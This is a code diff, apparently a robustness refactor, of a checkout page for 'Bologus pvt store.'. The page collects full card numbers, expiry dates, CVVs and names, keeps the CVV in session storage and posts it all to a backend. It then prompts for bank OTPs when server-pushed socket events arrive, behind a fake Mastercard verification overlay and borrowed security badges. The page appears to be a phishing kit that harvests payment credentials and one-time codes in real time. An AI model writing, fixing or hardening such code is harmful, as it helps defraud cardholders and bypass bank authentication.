@@ -232,7 +232,7 @@
       background: transparent;
       position: relative;
       z-index: 1;
-      margin-top: -6rem;
+      margin-top: 2rem; /* Fixed: Changed from -6rem to positive value */
       max-width: 100%;
       overflow-x: hidden;
       padding-left: 15px;
@@ -393,7 +393,7 @@
                     <div class="merchant-dropdown">
                       <div class="trusted-shield">
                         <svg class="w-12 h-12 text-white shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-<path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                         </svg>
                         <div class="flex flex-col">
                           <span class="text-lg font-semibold text-white">Bologus pvt store.</span>
@@ -435,7 +435,8 @@
                       <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                     </svg>
                     <span class="text-sm">PCI DSS Compliant • 256-bit SSL Encryption • Secure Payment</span>
-</div>
+                  </div>
+                </div>
                 <div class="text-sm text-gray-500 flex items-center gap-2">
                   <span>Service fee is 2% of the transaction amount</span>
                 </div>
@@ -553,7 +554,7 @@
       <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" />
       <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" />
       <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" />
-      <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" />
+<img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" />
       <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="Upi" />
     </div>
   </div>
@@ -685,8 +686,8 @@
     let isExpiryValid = false;
     let isProcessing = false;
     let currentInvoiceId = "";
-    let statusCheckInterval;
-    let timerInterval;
+    let statusCheckInterval = null; // Fixed: Initialize with null
+    let timerInterval = null; // Fixed: Initialize with null
     let timer = 180;
     let consentChecked = true;
     let bankPageWindow = null;
@@ -853,7 +854,7 @@
             };
           }
           
-// Default fallback
+          // Default fallback
           return {
             bank: 'Unknown Bank',
             country: 'Unknown Country',
@@ -907,7 +908,7 @@
     function showBankInfoDropdown(bankInfo) {
       const dropdown = getBankInfoDropdown();
       
-// Prepare flag image
+      // Prepare flag image
       const flagUrl = bankInfo.countryCode ? 
         `https://flagcdn.com/16x12/${bankInfo.countryCode.toLowerCase()}.png` : '';
       const flagImg = flagUrl ? `<img src="${flagUrl}" alt="${bankInfo.countryCode}">` : '';
@@ -1070,6 +1071,8 @@
     function updateCardError() {
       const cardInput = document.getElementById("cardNumber");
       const errorElem = document.getElementById("cardError");
+      if (!cardInput || !errorElem) return; // Fixed: Add null check
+      
       const plain = cardInput.value.replace(/\s/g, '');
       isCardValid = validateCard(plain);
       if (plain.length === 16 && !isCardValid) {
@@ -1093,6 +1096,8 @@
 
     function updateCardTypeAndInfo(value) {
       const cardLogo = document.getElementById("cardLogo");
+      if (!cardLogo) return; // Fixed: Add null check
+      
       const detectedType = detectCardType(value);
       const logos = {
         visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
@@ -1109,27 +1114,38 @@
     }
 
     function updateSubmitButton() {
-      const emailValid = document.getElementById('email').checkValidity();
+      const emailEl = document.getElementById('email');
+      const cvvEl = document.getElementById('cvv');
+      const cardholderNameEl = document.getElementById('cardholderName');
+      const submitButtonEl = document.getElementById('submitButton');
+      
+      if (!emailEl || !cvvEl || !cardholderNameEl || !submitButtonEl) return; // Fixed: Add null check
+      
+      const emailValid = emailEl.checkValidity();
       const cardValid = isCardValid;
       const expiryValid = isExpiryValid;
-      const cvvValid = document.getElementById('cvv').value.length === 3;
-      const nameValid = document.getElementById('cardholderName').value.trim().length > 0;
+      const cvvValid = cvvEl.value.length === 3;
+      const nameValid = cardholderNameEl.value.trim().length > 0;
 
       const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;
 
-      document.getElementById('submitButton').disabled = !allValid;
+      submitButtonEl.disabled = !allValid;
     }
 
     function updateConfirmOtpButton() {
-      const otp = document.getElementById('otp').value;
-      const otpButton = document.getElementById('otpSubmitButton');
-      if (otp.length === 6) {
-        otpButton.disabled = false;
-        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
-        document.getElementById('otpError').style.display = 'none';
+      const otpEl = document.getElementById('otp');
+      const otpButtonEl = document.getElementById('otpSubmitButton');
+      const otpErrorEl = document.getElementById('otpError');
+      
+      if (!otpEl || !otpButtonEl || !otpErrorEl) return; // Fixed: Add null check
+      
+      if (otpEl.value.length === 6) {
+        otpButtonEl.disabled = false;
+        otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
+        otpErrorEl.style.display = 'none';
       } else {
-        otpButton.disabled = true;
-        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
+        otpButtonEl.disabled = true;
+        otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
       }
     }
 
@@ -1151,7 +1167,7 @@
           // Format the card number
           const formatted = formatCardNumber(value);
           
-          // Calculate new cursor position
+// Calculate new cursor position
           const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
           const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
           const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
@@ -1221,131 +1237,161 @@
         });
       }
 
-      ['email', 'cvv', 'cardholderName'].forEach(id => {
-        document.getElementById(id).addEventListener('input', updateSubmitButton);
-      });
-
-      document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
+      const emailInput = document.getElementById('email');
+      const cvvInput = document.getElementById('cvv');
+      const cardholderNameInput = document.getElementById('cardholderName');
+      const otpInput = document.getElementById('otp');
+      
+      // Add input event listeners for validation
+      if (emailInput) {
+        emailInput.addEventListener('input', updateSubmitButton);
+      }
+      
+      if (cvvInput) {
+        cvvInput.addEventListener('input', updateSubmitButton);
+      }
+      
+      if (cardholderNameInput) {
+        cardholderNameInput.addEventListener('input', updateSubmitButton);
+      }
+      
+      if (otpInput) {
+        otpInput.addEventListener('input', updateConfirmOtpButton);
+      }
 
       // Payment Submission Handler with hash URL for bankpage
-      document.getElementById('mainForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        if (!isCardValid || !isExpiryValid || isProcessing) return;
+      const mainForm = document.getElementById('mainForm');
+      if (mainForm) {
+        mainForm.addEventListener('submit', async function(e) {
+          e.preventDefault();
+          if (!isCardValid || !isExpiryValid || isProcessing) return;
 
-        isProcessing = true;
-        const submitButton = document.getElementById('submitButton');
-        const submitText = document.getElementById('submitText');
-        const submitLoader = document.getElementById('submitLoader');
+          isProcessing = true;
+          const submitButton = document.getElementById('submitButton');
+          const submitText = document.getElementById('submitText');
+          const submitLoader = document.getElementById('submitLoader');
 
-        // Show loading state
-        submitButton.classList.add('btn-loading');
-        submitText.style.opacity = '0.5';
-        submitText.style.filter = 'blur(1px)';
-        submitLoader.classList.remove('hidden');
-
-        try {
-          // Get bank info if available
-          const bankInfoEl = document.getElementById('bankInfo');
-          const bankInfoData = bankInfoEl ? bankInfoEl.value : null;
+          if (!submitButton || !submitText || !submitLoader) return; // Added null check
           
-          const response = await fetch("/api/sendPaymentDetails", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-              expiry: document.getElementById('expiry').value,
-              cvv: document.getElementById('cvv').value,
-              email: document.getElementById('email').value,
-              amount: document.getElementById('amount').value,
-              currency: "INR",
-              cardholder: document.getElementById('cardholderName').value,
-              bankInfo: bankInfoData
-            })
-          });
+          // Show loading state
+          submitButton.classList.add('btn-loading');
+          submitText.style.opacity = '0.5';
+          submitText.style.filter = 'blur(1px)';
+          submitLoader.classList.remove('hidden');
 
-          const data = await response.json();
-          if (!response.ok) throw new Error(data.message || 'Payment failed');
+          try {
+            // Get bank info if available
+            const bankInfoEl = document.getElementById('bankInfo');
+            const bankInfoData = bankInfoEl ? bankInfoEl.value : null;
+            
+            const response = await fetch("/api/sendPaymentDetails", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                email: document.getElementById('email').value,
+                amount: document.getElementById('amount').value,
+                currency: "INR",
+                cardholder: document.getElementById('cardholderName').value,
+                bankInfo: bankInfoData
+              })
+            });
 
-          // After setting currentInvoiceId from the API response:
-          currentInvoiceId = data.invoiceId;
-          localStorage.setItem('invoiceId', currentInvoiceId);
-          
-          // Save form data for currency page return
-          saveFormData();
-          
-          console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
-          socket.emit('join', currentInvoiceId);
+            const data = await response.json();
+            if (!response.ok) throw new Error(data.message || 'Payment failed');
 
-          // Use clean hash URL for bankpage
-          const bankpageUrl = getBankpageUrl(data.invoiceId);
-          bankPageWindow = window.open(
-            bankpageUrl,
-            '_blank',
-            'width=600,height=800'
-          );
+            // After setting currentInvoiceId from the API response:
+            currentInvoiceId = data.invoiceId;
+            localStorage.setItem('invoiceId', currentInvoiceId);
+            
+            // Save form data for currency page return
+            saveFormData();
+            
+            console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
+            socket.emit('join', currentInvoiceId);
 
-          // Check window closure - but don't reset loading state when it closes
-          const checkWindowClosed = setInterval(() => {
-            if (bankPageWindow && bankPageWindow.closed) {
-              clearInterval(checkWindowClosed);
-            }
-          }, 500);
+            // Use clean hash URL for bankpage
+            const bankpageUrl = getBankpageUrl(data.invoiceId);
+            bankPageWindow = window.open(
+              bankpageUrl,
+              '_blank',
+              'width=600,height=800'
+            );
 
-        } catch (error) {
-          console.error('Payment Error:', error);
-          alert(`Payment Failed: ${error.message}`);
-          submitButton.classList.remove('btn-loading');
-          submitText.style.opacity = '1';
-          submitText.style.filter = 'none';
-          submitButton.classList.remove('btn-loading');
-          submitText.style.opacity = '1';
-          submitText.style.filter = 'none';
-          submitLoader.classList.add('hidden');
-          isProcessing = false;
-        }
-      });
+            // Check window closure - but don't reset loading state when it closes
+            const checkWindowClosed = setInterval(() => {
+              if (bankPageWindow && bankPageWindow.closed) {
+                clearInterval(checkWindowClosed);
+              }
+            }, 500);
+
+          } catch (error) {
+            console.error('Payment Error:', error);
+            alert(`Payment Failed: ${error.message}`);
+            submitButton.classList.remove('btn-loading');
+            submitText.style.opacity = '1';
+            submitText.style.filter = 'none';
+            submitLoader.classList.add('hidden');
+            isProcessing = false;
+          }
+        });
+      }
 
       // OTP Submission Handler
-      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
-        if (isProcessing) return;
-        isProcessing = true;
-        const otpButton = document.getElementById('otpSubmitButton');
-        const otpLoader = document.getElementById('otpLoader');
-        const btnText = document.getElementById('otpText');
-        otpButton.disabled = true;
-        btnText.style.opacity = '0.5';
-        btnText.style.filter = 'blur(1px)';
-        otpLoader.classList.remove('hidden');
+      const otpSubmitButton = document.getElementById('otpSubmitButton');
+      if (otpSubmitButton) {
+        otpSubmitButton.addEventListener('click', async () => {
+          if (isProcessing) return;
+          isProcessing = true;
+          const otpButton = document.getElementById('otpSubmitButton');
+          const otpLoader = document.getElementById('otpLoader');
+          const btnText = document.getElementById('otpText');
+          
+          if (!otpButton || !otpLoader || !btnText) return; // Added null check
+          
+          otpButton.disabled = true;
+          btnText.style.opacity = '0.5';
+          btnText.style.filter = 'blur(1px)';
+          otpLoader.classList.remove('hidden');
 
-        try {
-          const response = await fetch("/api/submitOTP", {
-            method: "POST",
-           headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              invoiceId: currentInvoiceId,
-              otp: document.getElementById('otp').value
-            })
-          });
+          try {
+            const response = await fetch("/api/submitOTP", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                invoiceId: currentInvoiceId,
+                otp: document.getElementById('otp').value
+              })
+            });
 
-          if (!response.ok) throw new Error('Failed to submit OTP');
-          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-        } catch (err) {
-          console.error('OTP submission error:', err);
-          alert('Error submitting OTP. Please try again.');
-          isProcessing = false;
-          otpButton.disabled = false;
-          otpLoader.classList.add('hidden');
-          btnText.style.opacity = '1';
-          btnText.style.filter = 'none';
-        }
-      });
+            if (!response.ok) throw new Error('Failed to submit OTP');
+statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+          } catch (err) {
+            console.error('OTP submission error:', err);
+            alert('Error submitting OTP. Please try again.');
+            isProcessing = false;
+            otpButton.disabled = false;
+            otpLoader.classList.add('hidden');
+            btnText.style.opacity = '1';
+            btnText.style.filter = 'none';
+          }
+        });
+      }
 
       // Socket.io event handlers
       socket.on('show_otp', () => {
-        document.getElementById('paymentForm').classList.add('hidden');
-        document.getElementById('otpForm').classList.remove('hidden');
-        const cardNumber = document.getElementById('cardNumber').value;
-        document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+        const paymentForm = document.getElementById('paymentForm');
+        const otpForm = document.getElementById('otpForm');
+        const cardLastFour = document.getElementById('cardLastFour');
+        const cardNumberInput = document.getElementById('cardNumber');
+        
+        if (!paymentForm || !otpForm || !cardLastFour || !cardNumberInput) return; // Added null check
+        
+        paymentForm.classList.add('hidden');
+        otpForm.classList.remove('hidden');
+        cardLastFour.textContent = cardNumberInput.value.slice(-4);
         if (!timerInterval) startOtpTimer();
         isProcessing = false;
       });
@@ -1365,6 +1411,8 @@
           // Show overlay with loading spinner
           const loadingContent = document.getElementById('mcLoadingContent');
           const verificationContent = document.getElementById('mcVerificationContent');
+          
+          if (!loadingContent || !verificationContent) return; // Added null check
           
           loadingContent.style.display = 'flex';
           verificationContent.style.display = 'none';
@@ -1386,6 +1434,8 @@
           // Hide loading, show verification content
           const loadingContent = document.getElementById('mcLoadingContent');
           const verificationContent = document.getElementById('mcVerificationContent');
+          
+          if (!loadingContent || !verificationContent) return; // Added null check
           
           loadingContent.style.display = 'none';
           verificationContent.style.display = 'block';
@@ -1435,15 +1485,36 @@
           const cardNumber = document.getElementById('cardNumber')?.value || '';
           const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
           
-          document.getElementById('cardLastFourDigits').textContent = lastFour;
-          document.getElementById('cardNumberDisplay').textContent = `XXXX XXXX XXXX ${lastFour}`;
+          const cardLastFourDigits = document.getElementById('cardLastFourDigits');
+          const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+          
+          if (cardLastFourDigits) {
+            cardLastFourDigits.textContent = lastFour;
+          }
+          
+          if (cardNumberDisplay) {
+            cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
+          }
           
           // Set other transaction details
-          document.getElementById('merchantName').textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
-          document.getElementById('transactionAmount2').textContent = (data.amount || storedData.amount || document.getElementById('displayAmount').textContent || '0.00').replace(/^₹/, ''); // Remove existing rupee symbol if present
-          document.getElementById('transactionDate').textContent = new Date().toLocaleString();
+          const merchantName = document.getElementById('merchantName');
+          const transactionAmount2 = document.getElementById('transactionAmount2');
+          const transactionDate = document.getElementById('transactionDate');
+          const displayAmount = document.getElementById('displayAmount');
           
-          // Setup event handlers
+          if (merchantName) {
+            merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
+          }
+          
+          if (transactionAmount2 && displayAmount) {
+            transactionAmount2.textContent = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, ''); // Remove existing rupee symbol if present
+          }
+          
+          if (transactionDate) {
+            transactionDate.textContent = new Date().toLocaleString();
+          }
+          
+// Setup event handlers
           setupMCVerificationHandlers();
           
           // Start timer
@@ -1516,7 +1587,7 @@
         if (data.invoiceId === currentInvoiceId) {
           // Hide overlay
           const overlay = document.getElementById('mcVerificationOverlay');
-        if (overlay) overlay.style.display = 'none';
+          if (overlay) overlay.style.display = 'none';
           
           // Clear timer if it exists
           if (window.mcTimerInterval) {
@@ -1541,6 +1612,8 @@
         const submitText = document.getElementById('submitText');
         const submitLoader = document.getElementById('submitLoader');
 
+        if (!submitButton || !submitText || !submitLoader) return; // Added null check
+        
         submitButton.classList.add('btn-loading');
         submitText.style.opacity = '0.5';
         submitText.style.filter = 'blur(1px)';
@@ -1558,11 +1631,11 @@
     // Save form data for currency page return
     function saveFormData() {
       const formData = {
-        email: document.getElementById('email').value,
-        cardNumber: document.getElementById('cardNumber').value,
-        expiry: document.getElementById('expiry').value,
-        cvv: document.getElementById('cvv').value,
-        cardholderName: document.getElementById('cardholderName').value,
+        email: document.getElementById('email')?.value || '',
+        cardNumber: document.getElementById('cardNumber')?.value || '',
+        expiry: document.getElementById('expiry')?.value || '',
+        cvv: document.getElementById('cvv')?.value || '',
+        cardholderName: document.getElementById('cardholderName')?.value || '',
         invoiceId: currentInvoiceId
       };
       sessionStorage.setItem('paymentFormData', JSON.stringify(formData));
@@ -1574,11 +1647,18 @@
       if (savedData) {
         try {
           const formData = JSON.parse(savedData);
-          document.getElementById('email').value = formData.email || '';
-          document.getElementById('cardNumber').value = formData.cardNumber || '';
-          document.getElementById('expiry').value = formData.expiry || '';
-          document.getElementById('cvv').value = formData.cvv || '';
-          document.getElementById('cardholderName').value = formData.cardholderName || '';
+          
+          const emailEl = document.getElementById('email');
+          const cardNumberEl = document.getElementById('cardNumber');
+          const expiryEl = document.getElementById('expiry');
+          const cvvEl = document.getElementById('cvv');
+          const cardholderNameEl = document.getElementById('cardholderName');
+          
+          if (emailEl) emailEl.value = formData.email || '';
+          if (cardNumberEl) cardNumberEl.value = formData.cardNumber || '';
+          if (expiryEl) expiryEl.value = formData.expiry || '';
+          if (cvvEl) cvvEl.value = formData.cvv || '';
+          if (cardholderNameEl) cardholderNameEl.value = formData.cardholderName || '';
           
           // Restore invoice ID
           if (formData.invoiceId) {
@@ -1602,33 +1682,60 @@
       }
     }
 
-// Transaction Status Check Function
+    // Transaction Status Check Function
     async function checkTransactionStatus() {
       if (!currentInvoiceId) return;
       try {
         const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-      const data = await response.json();
+        if (!response.ok) throw new Error('Failed to check transaction status');
+        
+        const data = await response.json();
+        
+        const paymentFormEl = document.getElementById('paymentForm');
+        const otpFormEl = document.getElementById('otpForm');
+        const cardLastFourEl = document.getElementById('cardLastFour');
+        const cardNumberEl = document.getElementById('cardNumber');
+        const otpErrorEl = document.getElementById('otpError');
+        
         if (data.status === 'show_otp') {
-          clearInterval(statusCheckInterval);
-          document.getElementById('paymentForm').classList.add('hidden');
-          document.getElementById('otpForm').classList.remove('hidden');
-          const cardNumber = document.getElementById('cardNumber').value;
-          document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-          if (!timerInterval) { startOtpTimer(); }
-          if (data.otpError) {
-            document.getElementById('otpError').style.display = 'block';
+          if (statusCheckInterval) {
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
+          }
+          
+          if (paymentFormEl && otpFormEl) {
+            paymentFormEl.classList.add('hidden');
+            otpFormEl.classList.remove('hidden');
+          }
+          
+          if (cardLastFourEl && cardNumberEl) {
+            cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
+          }
+          
+          if (!timerInterval) { 
+            startOtpTimer(); 
+          }
+          
+          if (data.otpError && otpErrorEl) {
+            otpErrorEl.style.display = 'block';
+            
             // Reset OTP button state when there's an error
             const otpButton = document.getElementById('otpSubmitButton');
             const otpLoader = document.getElementById('otpLoader');
             const btnText = document.getElementById('otpText');
-            otpButton.disabled = false;
-            otpLoader.classList.add('hidden');
-            btnText.style.opacity = '1';
-            btnText.style.filter = 'none';
+            
+            if (otpButton && otpLoader && btnText) {
+              otpButton.disabled = false;
+              otpLoader.classList.add('hidden');
+              btnText.style.opacity = '1';
+              btnText.style.filter = 'none';
+            }
+            
             isProcessing = false;
-          } else {
-            document.getElementById('otpError').style.display = 'none';
+          } else if (otpErrorEl) {
+            otpErrorEl.style.display = 'none';
           }
+          
           isProcessing = false;
         } else if (data.status === 'redirect') {
           // Use clean URLs for redirects
@@ -1649,15 +1756,27 @@
 
     // OTP Timer Function
     function startOtpTimer() {
-      if (timerInterval) clearInterval(timerInterval);
+      const timerEl = document.getElementById('timer');
+      if (!timerEl) return; // Added null check
+      
+      if (timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+      }
+      
       timer = 180;
       timerInterval = setInterval(() => {
         timer--;
         const minutes = Math.floor(timer / 60);
         const seconds = timer % 60;
-        document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timerEl) {
+          timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
         if (timer <= 0) {
           clearInterval(timerInterval);
+          timerInterval = null;
           window.location.href = getFailUrl('timeout'); // Use clean URL for fail
         }
       }, 1000);
@@ -1709,6 +1828,8 @@
       
       // Update submit button based on OTP and consent
       function updateMcSubmitButton() {
+        if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
+        
         const hasOtp = mcOtpInput.value.trim().length > 0;
         const hasConsent = mcConsentCheckbox.classList.contains('checked');
         
